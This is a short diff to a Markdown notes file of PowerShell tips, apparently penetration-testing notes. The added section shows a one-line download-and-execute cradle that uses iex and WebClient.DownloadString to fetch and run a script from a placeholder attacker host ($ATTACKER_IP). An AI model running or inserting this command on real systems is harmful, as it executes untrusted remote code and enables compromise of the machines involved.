@@ -127,3 +127,11 @@ There are probably smarter ways.
 ```
 Get-LocalGroupMember Users | Where-Object {$_.ObjectClass -Eq "User"} | ForEach-Object -Process {Get-LocalUser $_.Name.split('\')[1]}
 ```
+
+## Download and Execute in one line
+
+If you want to download and execute a script in one go, do:
+
+```
+iex ((New-Object System.Net.WebClient).DownloadString('http://$ATTACKER_IP/SomePowershell.ps1'))
+```
